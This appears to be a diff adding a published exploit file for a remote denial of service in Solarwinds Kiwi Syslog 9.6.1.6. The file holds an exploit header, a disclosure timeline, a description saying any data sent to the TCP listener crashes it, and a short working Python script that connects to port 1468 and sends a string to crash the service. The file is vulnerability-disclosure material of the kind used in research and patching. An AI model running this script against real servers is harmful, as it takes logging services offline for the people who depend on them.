@@ -1,0 +1,55 @@
+# Exploit Title: Solarwinds Kiwi Syslog 9.6.1.6 - Remote Denial of Service (Type Mismatch)
+# Date: 26/05/2017
+# Exploit Author: Guillaume Kaddouch
+#   Twitter: @gkweb76
+#   Blog: https://networkfilter.blogspot.com
+#   GitHub: https://github.com/gkweb76/exploits
+# Vendor Homepage: http://www.solarwinds.com/
+# Software Link: http://downloads.solarwinds.com/solarwinds/Release/Kiwi/Syslog/Kiwi-Syslog-Server-9.6.1-Eval.zip
+# Version: 9.6.1.6
+# Tested on: Windows 7 SP1 Family x64 (FR) and Windows 8.1 Pro x64
+# Category: DoS
+
+"""
+Disclosure Timeline:
+--------------------
+2017-05-20: Vulnerability discovered
+2017-05-26: Vendor contacted
+2017-05-31: Vendor answered (technical support)
+2017-05-31: Vendor contacted (no answer)
+2017-08-01: Exploit published
+
+
+Description :
+-------------
+A remote Denial of Service exists in Kiwi Syslog 9.6.1.6 in the TCP listener.
+Apparently any data sent to it make it crash because of a Type Mismatch error.
+The syslog TCP listener is disabled by default.
+
+
+Instructions:
+-------------
+- Starts Kiwi Syslog, and enable the TCP listener in the settings, default port is 1468.
+- Run this exploit locally or from your remote attacking machine.
+"""
+
+#!/usr/bin/python
+import socket
+
+host    = "10.0.0.56"
+port    = 1468
+
+buffer  = "crash please?"
+
+try:
+        print "[*] Connecting to %s:%d" % (host, port)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+
+        print "[*] Sending buffer... (%d bytes)" % len(buffer)
+        s.send(buffer)
+        s.close()
+
+        print "[*] Done."
+except:
+        print "[-] Error connecting"
